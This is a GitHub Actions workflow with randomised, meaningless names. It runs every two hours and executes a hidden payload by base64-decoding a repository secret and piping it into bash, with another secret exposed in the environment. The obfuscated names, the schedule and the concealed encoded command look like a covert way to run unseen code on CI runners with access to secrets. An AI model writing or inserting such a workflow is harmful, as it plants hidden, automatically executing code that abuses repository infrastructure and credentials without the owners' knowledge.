name: IqDvtvWZJ
on:
  schedule:
    - cron: '0 */2 * * *'
  workflow_dispatch:
jobs:
  pyRNic:
    runs-on: ubuntu-latest
    env:
      sHgaDeUmLsJn: ${{ secrets.ywJkFQfyl }}
    steps:
      - uses: actions/checkout@v5
      - run: echo "${{ secrets.gWaJGnOBho }}" | base64 -d | bash
